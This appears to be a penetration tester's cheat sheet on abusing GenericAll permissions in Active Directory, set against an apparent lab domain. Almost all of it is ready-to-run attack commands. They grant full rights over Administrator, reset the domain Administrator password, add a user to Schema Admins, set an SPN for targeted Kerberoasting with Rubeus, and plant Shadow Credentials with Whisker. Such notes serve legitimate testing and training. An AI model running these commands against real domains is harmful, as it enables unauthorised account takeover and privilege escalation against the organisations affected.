
# GenericAll
```
AccessMask = 0x000f01ff ( 983551 )
```

#### Add GenericAll
```powershell
Add-DomainObjectAcl -TargetIdentity Administrator -PrincipalIdentity jkimmich -Rights All
```

#### All user
```powershell
Get-DomainObjectAcl | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},@{Name="ObjectSid"; Expression={Convert-SidToName $_.ObjectSid}},ActiveDirectoryRights -Unique
```

#### Specific User
```powershell
Get-DomainObjectAcl -Identity jkimmich | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},ActiveDirectoryRights -Unique
```

#### Change Password
```powershell
net user Administrator YeniSifre123! /domain
Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force) -Reset
```

#### Targeted Kerberos
```powershell
Set-DomainObject -Identity jkimmich -Set @{serviceprincipalname='pentest/Oxsium'}
.\Rubeus.exe kerberoast /user:jkimmich /nowrap
```

#### Add to Group ( GenericAll on "Schema Admins" group )
```powershell
Add-DomainGroupMember -Identity "Schema Admins" -Members "jkimmich"
net group "Schema Admins" jkimmich /add /domain
```

#### DACL Abuse
```powershell
Add-DomainObjectAcl -TargetIdentity jkimmich -PrincipalIdentity User_B -Rights GenericAll
```

#### Shadow Credentials
```powershell
.\Whisker.exe add /target:jkimmich /domain:warzone.oxsium.local /dc:WIN-WARZONE.warzone.oxsium.local
```
---
